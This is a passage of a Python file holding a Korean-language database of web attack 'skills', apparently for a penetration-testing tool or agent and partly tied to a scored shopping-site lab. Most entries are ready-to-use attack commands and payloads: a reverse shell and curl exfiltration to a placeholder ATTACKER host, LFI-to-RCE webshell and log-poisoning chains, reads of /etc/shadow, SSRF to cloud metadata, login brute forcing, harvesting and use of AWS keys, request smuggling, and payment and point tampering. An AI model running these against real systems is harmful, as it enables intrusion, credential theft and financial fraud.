        "127.0.0.1; bash -i >& /dev/tcp/ATTACKER/4444 0>&1",
        "127.0.0.1; curl http://ATTACKER/$(whoami)",
    ],
    "notes": "commix --os-shell로 대화형 셸. ; | && || `...` $(...) 모두 시도. 공백 필터 시: ${IFS}나 +로 대체.",
},

"16-018": {
    "name": "RCE — Local File Inclusion (LFI → RCE 체인)",
    "module": "RCE",
    "tags": ["lfi", "rce", "php-wrapper", "log-poisoning"],
    "desc": """LFI 취약점에서 RCE까지 에스컬레이션.
PHP wrapper로 코드 실행 또는 로그 오염.""",
    "tools": ["burpsuite", "liffy"],
    "commands": [
        "# 기본 LFI",
        "curl 'http://target/?page=../../../../etc/passwd'",
        "curl 'http://target/?file=../../../etc/shadow'",
        "# PHP wrapper",
        "curl 'http://target/?page=php://filter/read=convert.base64-encode/resource=/etc/passwd'",
        "curl 'http://target/?page=php://filter/read=convert.base64-encode/resource=../config.php'",
        "# data:// wrapper (RCE)",
        "curl 'http://target/?page=data://text/plain,<?php system($_GET[cmd]);?>&cmd=id'",
        "curl 'http://target/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+&cmd=id'",
        "# 로그 오염 (User-Agent에 PHP 코드)",
        "curl -A '<?php system($_GET[cmd]);?>' http://target/",
        "curl 'http://target/?page=../../../../var/log/apache2/access.log&cmd=id'",
        "# /proc/self/environ",
        "curl 'http://target/?page=../../../../proc/self/environ&cmd=id' -A '<?php system($_GET[cmd]);?>'",
    ],
    "payloads": [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "php://filter/read=convert.base64-encode/resource=index.php",
        "php://input",
        "data://text/plain,<?php phpinfo();?>",
        "zip://shell.zip%23shell.php",
        "phar://shell.phar/shell.php",
    ],
    "notes": "null byte(%00) PHP 5.3 이하. 경로 정규화: ....// → ../. log poisoning 경로: /var/log/nginx/access.log",
},

# ══════════════════════════════════════════════════════════════
# Path Traversal
# ══════════════════════════════════════════════════════════════

"16-019": {
    "name": "Path Traversal — 3단계 우회 (다운로드/파일 접근)",
    "module": "PathTraversal",
    "tags": ["path-traversal", "lfi", "download", "bypass"],
    "desc": """3단계 공략:
Level1: 기본 ../
Level2: 확장자 검증 우회
Level3: 경로 정규화 우회

다운로드 API의 filename 파라미터 변조.""",
    "tools": ["burpsuite", "curl"],
    "commands": [
        "# Level 1 - 기본",
        "curl 'http://target/api/download-level1.php?file=../../../etc/passwd'",
        "# Level 2 - 이중 인코딩",
        "curl 'http://target/api/download-level2.php?file=..%2F..%2F..%2Fetc%2Fpasswd'",
        "# Level 3 - ....// 패턴",
        "curl 'http://target/api/download-level3.php?file=....//....//....//etc/passwd'",
        "# 기타 우회",
        "curl 'http://target/download?file=%2e%2e%2f%2e%2e%2fetc/passwd'",
        "curl 'http://target/download?file=..././..././etc/passwd'",
        "curl 'http://target/download?file=..%c0%af..%c0%afetc/passwd'",
        "# Windows 경로",
        "curl 'http://target/download?file=..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts'",
    ],
    "payloads": [
        "../../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "....//....//....//etc/passwd",
        "..././..././etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%c0%af..%c0%afetc/passwd",
        "..%252f..%252fetc/passwd",
        "/etc/passwd%00.jpg",
    ],
    "notes": "다운로드 API에서 filename 파라미터가 핵심. ZIP 파일 내 경로에서도 발생 (Zip Slip).",
},

# ══════════════════════════════════════════════════════════════
# 종합 쇼핑몰 — 24개 취약점 공략 패턴
# ══════════════════════════════════════════════════════════════

"16-020": {
    "name": "종합 쇼핑몰 — 체계적 공략 (24개 취약점 엔드포인트)",
    "module": "WebApplication",
    "tags": ["pentest", "e-commerce", "comprehensive", "shop", "all-vulns"],
    "desc": """종합 쇼핑몰 24개 취약점:

[인증 우회 5개]
- POST /api/user/register.php — captcha/sms 우회
- POST /api/user/login.php — 사용자 열거 (username)
- POST /api/user/reset-password.php — auth_token 우회
- POST /api/merchant/change-audit-status.php — 인증 없음
- POST /api/admin/login.php — 브루트포스

[권한 상승 6개]
- POST /api/merchant/product-image-delete.php — product_no IDOR
- POST /api/merchant/ship-order.php — order_no IDOR
- GET /api/admin/user-list.php — 미인증 관리자 API
- GET /api/user/order-detail.php?order_no=X — IDOR
- GET /merchant/index — 미인증 접근
- GET /api/user/balance-records.php?user_hash=X — user_hash IDOR

[거래 변조 5개]
- POST /api/user/lottery.php — probabilities 조작
- POST /api/user/create-order.php — order_time/price 조작
- POST /api/user/recharge-callback.php — 레이스 리플레이
- POST /api/user/create-batch-order.php — use_points 조작
- POST /api/user/refund.php — refund_amount 변조

[입력 검증 8개]
- GET /api/user/search.php?keyword=X — SQLi
- POST /api/merchant/product-delete.php — SQLi (product_no)
- POST /api/merchant/submit-audit.php — XSS (description)
- POST /api/upload.php — 파일 업로드 (filename/category)
- GET /pay/index.php?redirect=X — Open Redirect
- POST /api/merchant/product-image-preview.php — SSRF
- GET /admin/js/config.js — AK/SK 키 노출""",
    "tools": ["burpsuite", "sqlmap", "curl"],
    "commands": [
        "# 정찰: 관리자 JS 키 노출 확인",
        "curl http://target/admin/js/config.js",
        "",
        "# 사용자 열거",
        "curl -X POST http://target/api/user/login.php -d 'username=admin&password=wrong'",
        "curl -X POST http://target/api/user/login.php -d 'username=notexist&password=wrong'",
        "",
        "# IDOR — 주문 조회",
        "curl -b 'session=USER_SESSION' 'http://target/api/user/order-detail.php?order_no=1001'",
        "curl -b 'session=USER_SESSION' 'http://target/api/user/order-detail.php?order_no=1000'",
        "",
        "# 미인증 관리자 API",
        "curl 'http://target/api/admin/user-list.php'",
        "curl 'http://target/merchant/index'",
        "",
        "# SQLi — 검색",
        "sqlmap -u 'http://target/api/user/search.php?keyword=test' --dbs --batch",
        "",
        "# SSRF — 이미지 미리보기",
        "curl -X POST http://target/api/merchant/product-image-preview.php -d 'image_url=http://169.254.169.254/latest/meta-data/'",
        "",
        "# Open Redirect",
        "curl -v 'http://target/pay/index.php?redirect=http://evil.com' --max-redirs 0",
        "",
        "# 결제 레이스 컨디션",
        "for i in {1..20}; do curl -s -X POST http://target/api/user/recharge-callback.php -d 'recharge_no=PAY001&amount=100' & done; wait",
    ],
    "payloads": [],
    "notes": "최대 점수 4800. 순서: AK/SK 노출 → 미인증 접근 → IDOR → SQLi → 거래변조 순으로 공략. 레이스컨디션은 Python threading으로.",
},

# ══════════════════════════════════════════════════════════════
# 사용자 열거 + 브루트포스
# ══════════════════════════════════════════════════════════════

"16-021": {
    "name": "사용자 열거 + 로그인 브루트포스",
    "module": "BruteForce",
    "tags": ["enumeration", "brute-force", "login", "rate-limit"],
    "desc": """응답 차이로 유효한 사용자명 식별 후 비밀번호 크래킹.
실전: login API가 username/password 오류를 다르게 반환.""",
    "tools": ["ffuf", "hydra", "burpsuite", "wfuzz"],
    "commands": [
        "# 사용자 열거 (응답 크기/메시지 차이)",
        "ffuf -X POST -u 'http://target/api/user/login.php' -d 'username=FUZZ&password=wrong' -w usernames.txt -mc 200 -fl 0",
        "ffuf -X POST -u 'http://target/login' -d 'user=FUZZ&pass=wrong' -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt",
        "# 비밀번호 브루트포스",
        "ffuf -X POST -u 'http://target/api/admin/login.php' -d 'password=FUZZ' -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -mc 200",
        "# hydra",
        "hydra -l admin -P /usr/share/wordlists/rockyou.txt target http-post-form '/api/admin/login.php:password=^PASS^:F=error'",
        "# 속도 제한 테스트",
        "for i in {1..20}; do curl -s -X POST http://target/login -d 'user=admin&pass=wrong' -o /dev/null -w '%{http_code}\n'; done",
    ],
    "payloads": [],
    "notes": "응답 시간/크기/메시지로 열거. 속도 제한 없으면 rockyou.txt로 빠른 크래킹 가능. X-Forwarded-For로 IP 우회.",
},

# ══════════════════════════════════════════════════════════════
# URL 오픈 리다이렉트
# ══════════════════════════════════════════════════════════════

"16-022": {
    "name": "Open Redirect — URL 임의 리다이렉션",
    "module": "OpenRedirect",
    "tags": ["open-redirect", "phishing", "oauth", "token-theft"],
    "desc": """GET /pay/index.php?redirect=http://evil.com
검증 없이 redirect 파라미터로 리다이렉션.
피싱 + OAuth 토큰 탈취에 활용 가능.""",
    "tools": ["burpsuite", "curl"],
    "commands": [
        "# 기본 확인",
        "curl -v 'http://target/pay/index.php?redirect=http://evil.com' --max-redirs 0",
        "# 필터 우회",
        "curl -v 'http://target/redirect?url=//evil.com' --max-redirs 0",
        "curl -v 'http://target/redirect?url=https://target.com@evil.com' --max-redirs 0",
        "curl -v 'http://target/redirect?url=http://evil.com%23target.com' --max-redirs 0",
        "curl -v 'http://target/redirect?url=http://target.com.evil.com' --max-redirs 0",
        "# OAuth 토큰 탈취",
        "curl -v 'http://target/oauth/authorize?redirect_uri=http://evil.com' --max-redirs 0",
    ],
    "payloads": [
        "http://evil.com",
        "//evil.com",
        "https://target.com@evil.com",
        "http://evil.com#target.com",
        "/\\evil.com",
        "http:evil.com",
        "javascript:alert(1)",
        "%2F%2Fevil.com",
    ],
    "notes": "결제/로그인 이후 redirect가 흔한 진입점. OAuth redirect_uri 검증 미흡 시 토큰 탈취 가능.",
},

# ══════════════════════════════════════════════════════════════
# AK/SK 키 노출 (JS/설정파일)
# ══════════════════════════════════════════════════════════════

"16-023": {
    "name": "AK/SK 키 노출 — JS/설정파일에서 클라우드 자격증명 탈취",
    "module": "SecretExposure",
    "tags": ["secret", "api-key", "aws", "ak-sk", "js-leak"],
    "desc": """GET /admin/js/config.js — AWS/클라우드 AK/SK 키 노출.
프론트엔드 JS 파일에 하드코딩된 API 키.""",
    "tools": ["curl", "trufflehog", "gitleaks"],
    "commands": [
        "# JS 파일에서 키 탐색",
        "curl http://target/admin/js/config.js",
        "curl http://target/js/app.js",
        "# 다양한 경로 시도",
        "for path in /js/config.js /static/config.js /assets/config.js /admin/js/config.js /api/config.js; do",
        "  result=$(curl -s http://target$path); [ -n \"$result\" ] && echo \"[+] $path: $result\"; done",
        "# 응답에서 키 패턴 추출",
        "curl -s http://target/js/app.js | grep -oE '(AKIA|ASIA)[A-Z0-9]{16}'",
        "curl -s http://target/js/app.js | grep -oE 'sk-[a-zA-Z0-9]{32,}'",
        "# 클라우드 자격증명 확인",
        "aws sts get-caller-identity --access-key-id AKIA... --secret-access-key ...",
    ],
    "payloads": [],
    "notes": "AWS AK: AKIA... / ASIA... (임시). 발견 즉시 s3 ls, iam list-users로 권한 확인. 버그바운티 P1급.",
},

# ══════════════════════════════════════════════════════════════
# CRLF 인젝션
# ══════════════════════════════════════════════════════════════

"16-024": {
    "name": "CRLF 인젝션 — HTTP 헤더 분리 / 로그 오염",
    "module": "CRLFInjection",
    "tags": ["crlf", "header-injection", "log-poisoning", "xss"],
    "desc": """HTTP 응답 헤더에 \\r\\n 삽입으로 헤더 분리.
실전: Accept-Language, User-Agent 헤더 기반 취약점.""",
    "tools": ["burpsuite", "curl"],
    "commands": [
        "# URL 파라미터 CRLF",
        "curl -v 'http://target/path?lang=ko%0d%0aSet-Cookie:+admin=true'",
        "curl -v 'http://target/redirect?url=http://evil.com%0d%0aContent-Length:+0%0d%0a%0d%0a<script>alert(1)</script>'",
        "# Accept-Language 헤더",
        "curl -H $'Accept-Language: ko\\r\\nSet-Cookie: admin=true' http://target/",
        "# XSS via CRLF",
        "curl -v 'http://target/?x=%0d%0a%0d%0a<script>alert(1)</script>'",
        "# 로그 오염",
        "curl -H $'User-Agent: Mozilla%0AX-Injected: true' http://target/",
    ],
    "payloads": [
        "%0d%0aSet-Cookie: admin=true",
        "%0d%0aLocation: http://evil.com",
        "%0d%0a%0d%0a<script>alert(1)</script>",
        "\r\nSet-Cookie: session=hacked",
        "%0aX-XSS-Protection: 0",
    ],
    "notes": "Location, Set-Cookie 헤더 분리로 세션 고정/XSS. URL 인코딩: %0d%0a = CRLF.",
},

# ══════════════════════════════════════════════════════════════
# 역직렬화 (PHP Unserialize)
# ══════════════════════════════════════════════════════════════

"16-025": {
    "name": "PHP 역직렬화 — unserialize() RCE",
    "module": "Deserialization",
    "tags": ["deserialization", "php", "rce", "unserialize", "magic-methods"],
    "desc": """PHP unserialize()로 객체 주입 → Magic 메서드 트리거 → RCE.
실전: deser 기초/연습/실전 3단계.""",
    "tools": ["phpggc", "burpsuite", "ysoserial"],
    "commands": [
        "# PHPGGC로 페이로드 생성",
        "phpggc -l",  # 가용 체인 목록
        "phpggc Monolog/RCE1 system id",
        "phpggc Monolog/RCE1 system 'id' -b",  # base64
        "phpggc Laravel/RCE1 system id -b",
        "",
        "# 기본 객체 주입 (클래스 구조 파악 후)",
        "# O:4:\"User\":1:{s:4:\"role\";s:5:\"admin\";}",
        "curl -X POST http://target/deserialize -d 'data=O:4:\"User\":1:{s:4:\"role\";s:5:\"admin\";}' --data-urlencode",
        "",
        "# PHP pop chain 예시",
        "php -r \"class Evil{public function __destruct(){system('id');}} echo serialize(new Evil());\"",
    ],
    "payloads": [
        'O:4:"User":1:{s:4:"role";s:5:"admin";}',
        'O:4:"User":2:{s:8:"username";s:5:"admin";s:4:"role";s:5:"admin";}',
    ],
    "notes": "phpggc로 프레임워크별 POP 체인 생성. 쿠키/hidden 필드에서 base64 인코딩된 직렬화 데이터 탐색.",
},

# ══════════════════════════════════════════════════════════════
# 디렉토리 탐색
# ══════════════════════════════════════════════════════════════

"16-026": {
    "name": "디렉토리 리스팅 + 민감 파일 탐색",
    "module": "DirectoryListing",
    "tags": ["directory-listing", "sensitive-file", "backup", "config"],
    "desc": """서버 설정 오류로 디렉토리 목록 노출.
백업 파일, 설정 파일, 소스코드 노출로 이어짐.""",
    "tools": ["ffuf", "dirsearch", "gobuster", "feroxbuster"],
    "commands": [
        "# 기본 디렉토리 스캔",
        "ffuf -u 'http://target/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403",
        "# 민감 파일 탐색",
        "ffuf -u 'http://target/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -mc 200",
        "# 백업 파일",
        "for ext in .bak .old .backup .sql .zip .tar.gz .config .env; do",
        "  curl -s -o /dev/null -w '%{http_code} %{url_effective}\\n' http://target/index.php$ext; done",
        "# 설정 파일",
        "for file in .env config.php database.php wp-config.php .git/config; do",
        "  curl -s http://target/$file | head -5; done",
        "# feroxbuster (재귀)",
        "feroxbuster -u http://target -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,bak",
    ],
    "payloads": [],
    "notes": ".git 노출 시 git-dumper로 소스코드 전체 복구 가능. .env에서 DB/API 키 획득. /backup/ 경로 반드시 확인.",
},

# ══════════════════════════════════════════════════════════════
# HTTP Request Smuggling
# ══════════════════════════════════════════════════════════════

"16-027": {
    "name": "HTTP 요청 밀수 (Request Smuggling) — CL.TE / TE.CL",
    "module": "RequestSmuggling",
    "tags": ["request-smuggling", "cl-te", "te-cl", "http2", "desync"],
    "desc": """프론트엔드(CDN/프록시)와 백엔드 서버의 Content-Length vs Transfer-Encoding 파싱 불일치.
실전 환경에서 Cloudflare Pingora CVE-2026-2833도 포함.""",
    "tools": ["burpsuite", "smuggler", "curl"],
    "commands": [
        "# CL.TE 기본 감지",
        "curl -X POST http://target/ -H 'Content-Length: 6' -H 'Transfer-Encoding: chunked' -d $'0\\r\\n\\r\\nX'",
        "# TE.CL",
        "curl -X POST http://target/ -H 'Transfer-Encoding: chunked' -H 'Content-Length: 4' -d $'1\\r\\nZ\\r\\n0\\r\\n\\r\\n'",
        "# smuggler 자동 탐지",
        "python3 smuggler.py -u http://target/",
        "# Burp Suite: HTTP Request Smuggler 확장",
        "# Repeater에서 Update Content-Length 해제 후 수동 테스트",
        "# H2.CL (HTTP/2 다운그레이드)",
        "# :method POST :path / :scheme https :authority target.com",
        "# content-length: 0",
        "# Transfer-Encoding: chunked",
    ],
    "payloads": [
        "POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX",
    ],
    "notes": "smuggler.py로 자동 탐지. Burp HTTP Request Smuggler 확장 사용. 응답 시간 지연으로 CL.TE 확인.",
},

# ══════════════════════════════════════════════════════════════
# 쇼핑몰 취약점 — 포인트/확률 조작
# ══════════════════════════════════════════════════════════════

"16-028": {
    "name": "복권/확률 조작 + 포인트 무한 획득",
    "module": "BusinessLogic",
    "tags": ["business-logic", "lottery", "probability", "points", "gambling"],
    "desc": """복권/확률 조작 API:
POST /api/user/lottery.php — probabilities 배열 클라이언트 전송
클라이언트가 당첨 확률을 직접 전송 → 서버 검증 없음.""",
    "tools": ["burpsuite", "curl"],
    "commands": [
        "# 정상 요청 캡처",
        "curl -X POST http://target/api/user/lottery.php -b 'session=X' -d 'probabilities=[0.1,0.2,0.3,0.2,0.2]'",
        "# 1등 확률 100%로 조작",
        "curl -X POST http://target/api/user/lottery.php -b 'session=X' -d 'probabilities=[1,0,0,0,0]'",
        "# 포인트 조작",
        "curl -X POST http://target/api/user/create-batch-order.php -b 'session=X' -d 'use_points=99999999&product_id=1'",
        "# 잔액 음수 전송",
        "curl -X POST http://target/api/user/recharge.php -d 'amount=-1000'",
    ],
    "payloads": [
        "probabilities=[1,0,0,0,0]",
        "probabilities=[0,0,0,0,1]",
        "amount=-9999",
        "use_points=999999999",
        "refund_amount=999999",
    ],
    "notes": "확률 배열이 클라이언트에서 오면 서버 검증 없는 경우가 많음. Burp Repeater로 변조 후 반복 실행.",
},

}  # SKILLS_DB_16 끝


# ══════════════════════════════════════════════════════════════
# 인덱싱
# ══════════════════════════════════════════════════════════════

MODULE_INDEX_16: dict[str, list[str]] = {}
TAG_INDEX_16: dict[str, list[str]] = {}

for skill_id, skill in SKILLS_DB_16.items():
    mod = skill.get("module", "")
    if mod:
        MODULE_INDEX_16.setdefault(mod, []).append(skill_id)
    for tag in skill.get("tags", []):
        TAG_INDEX_16.setdefault(tag, []).append(skill_id)
